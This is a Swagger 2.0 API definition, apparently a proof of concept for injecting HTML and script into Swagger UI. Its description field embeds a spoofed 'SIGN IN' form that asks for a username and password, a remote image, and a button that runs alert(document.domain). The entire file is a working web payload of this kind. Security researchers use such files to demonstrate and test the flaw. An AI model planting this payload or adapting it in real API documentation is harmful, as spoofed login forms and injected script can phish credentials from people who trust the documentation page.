swagger: '2.0'
info:
  version: 1.0.0
  title: Fake Login Page❗️
  description: |
    <img src="https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test2.png" />
    <div class="login-form">
      <div class="heading">
        <h1>SIGN IN</h1>
      </div>
      <div class="form-container">
        <form class="form-signin">
          <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" name="username" size="20" />
          </div>
          <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" name="password" size="20" />
          </div>
          <div class="form-group">
            <button type="submit" onclick="alert(document.domain)" class="btn btn-defaul">Login</button>
          </div>
        </form>
      </div>
    </div>
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful
